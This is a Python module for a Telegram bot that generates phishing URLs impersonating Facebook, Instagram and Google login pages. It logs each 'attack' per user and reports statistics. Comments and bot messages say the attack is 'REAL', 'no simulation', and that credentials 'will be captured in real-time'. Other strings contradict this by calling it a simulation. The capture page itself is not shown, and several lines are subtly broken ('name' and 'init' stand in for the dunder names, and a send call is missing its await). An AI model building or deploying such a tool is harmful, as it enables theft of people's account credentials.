import time
import logging
from telegram import Update
from telegram.ext import ContextTypes
import json
import os
from const import RAILWAY_PUBLIC_URL, USER_DATA_FILE

logger = logging.getLogger(name)

class ZPhisherManager:
    def init(self):
        self.active_attacks = {}
        
    def start_zphisher_attack(self, user_id: int, target: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start REAL phishing attack (no simulation)"""
        try:
            # Generate REAL URL
            phishing_url = self._generate_phishing_url(user_id, target)
            
            if phishing_url:
                # Send REAL URL to user
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🔗 Real Phishing URL Created:\n{phishing_url}\n\nTarget: {target}\n\n⚠️ This is a LIVE phishing page - credentials will be captured in real-time!"
                )
                
                # Save to user data
                self._save_phishing_url(user_id, phishing_url, target)
            else:
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="❌ Failed to create phishing URL. Check your RAILWAY_PUBLIC_URL in const.py"
                )
            
        except Exception as e:
            logger.error(f"Error starting attack: {e}")
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error starting phishing simulation."
            )
    
    def _generate_phishing_url(self, user_id: int, target: str) -> str:
        """Generate REAL Railway URL (no fake Cloudflare)"""
        try:
            base_url = RAILWAY_PUBLIC_URL
            
            import hashlib
            unique_id = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()[:8]
            
            # Create real URL based on target
            target = target.lower()
            if target in ['facebook', 'fb']:
                phishing_url = f"{base_url}/facebook?uid={user_id}&track={unique_id}"
            elif target in ['instagram', 'ig']:
                phishing_url = f"{base_url}/instagram?uid={user_id}&track={unique_id}"
            elif target in ['google', 'gmail']:
                phishing_url = f"{base_url}/google?uid={user_id}&track={unique_id}"
            else:
                phishing_url = f"{base_url}/facebook?uid={user_id}&track={unique_id}"
            
            logger.info(f"Generated REAL URL: {phishing_url}")
            return phishing_url
            
        except Exception as e:
            logger.error(f"Error generating URL: {e}")
            return None

    def _save_phishing_url(self, user_id: int, url: str, target: str):
        """Save phishing URL in user data"""
        try:
            with open(USER_DATA_FILE, 'r') as f:
                data = json.load(f)
            
            if str(user_id) not in data["users"]:
                data["users"][str(user_id)] = {}
            
            if "phishing_attacks" not in data["users"][str(user_id)]:
                data["users"][str(user_id)]["phishing_attacks"] = []
            
            attack_data = {
                "timestamp": time.time(),
                "target": target,
                "url": url,
                "status": "active"
            }
            
            data["users"][str(user_id)]["phishing_attacks"].append(attack_data)
            data["users"][str(user_id)]["last_activity"] = time.time()
            
            with open(USER_DATA_FILE, 'w') as f:
                json.dump(data, f, indent=2)
                
        except Exception as e:
            logger.error(f"Error saving phishing URL: {e}")

# Global instance
zphisher_manager = ZPhisherManager()
async def start_phishing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start phishing simulation"""
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "Please specify a target for the phishing simulation.\n"
            "Usage: /phish <target>\n"
            "Example: /phish facebook"
        )
        return
    
    target = ' '.join(context.args)
    
    await update.message.reply_text(
        f"🛡️ Starting REAL phishing simulation for: {target}\n"
        "Generating live phishing URL..."
    )
    
    # Start REAL attack (no simulation)
    zphisher_manager.start_zphisher_attack(user_id, target, update, context)

async def get_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get user's phishing statistics"""
    user_id = update.effective_user.id
    
    try:
        with open(USER_DATA_FILE, 'r') as f:
            data = json.load(f)
        
        user_data = data["users"].get(str(user_id), {})
        
        if not user_data:
            await update.message.reply_text("No data found for your account.")
            return
        
        attacks = user_data.get("phishing_attacks", [])
        clicks = user_data.get("click_data", [])
        
        message = (
            f"📊 Your Phishing Statistics:\n"
            f"Total Attacks: {len(attacks)}\n"
            f"Last Activity: {time.ctime(user_data.get('last_activity', 0))}"
        )
        
        if attacks:
            message += f"\n\nRecent Attacks:"
            for attack in attacks[-3:]:
                message += f"\n- {attack['target']} ({attack['url']})"
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error getting stats: {e}")
        await update.message.reply_text("❌ Error retrieving statistics.")
